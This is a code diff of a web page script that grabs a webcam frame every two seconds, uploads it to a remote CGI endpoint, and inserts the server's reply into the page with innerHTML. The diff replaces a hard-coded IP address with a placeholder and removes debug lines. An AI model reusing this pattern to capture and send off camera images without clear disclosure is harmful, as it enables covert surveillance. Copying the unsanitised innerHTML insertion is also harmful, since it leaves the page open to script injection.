@@ -14,10 +14,8 @@
     <video id="video" playsinline></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <script>
-            alert("start");
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
@@ -27,22 +25,19 @@
                 console.error('Error accessing webcam:', error);
             });
 
-
         setInterval(() => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             canvas.toBlob((blob) => {
                 const formData = new FormData();
-                    let i = 0;
-                    formData.append('image', blob, `image${i++}.png` );
-                fetch('https://3.110.153.54/cgi-bin/upload.py', { method: 'POST', body: formData })
+                formData.append('image', blob, `image.png` );
+                fetch('https://your-server-address/cgi-bin/upload.py', { method: 'POST', body: formData })
                     .then(response => response.text())
-                    .then(data => document.getElementById("d1").innerHTML = data )
+                    .then(data => document.getElementById("d1").innerHTML = data)
                     .catch(error => console.error('Error uploading image:', error));
             });
         }, 2000);
-
     </script>
     <div id="videoControls">
       <button id="playPauseButton"></button>
@@ -59,6 +54,5 @@
   </h2>
   <script src="tiny-fullscreen-shim.js"></script>
   <script src="mobile-web-video-playback.js"></script>
-
 </body>
 </html>
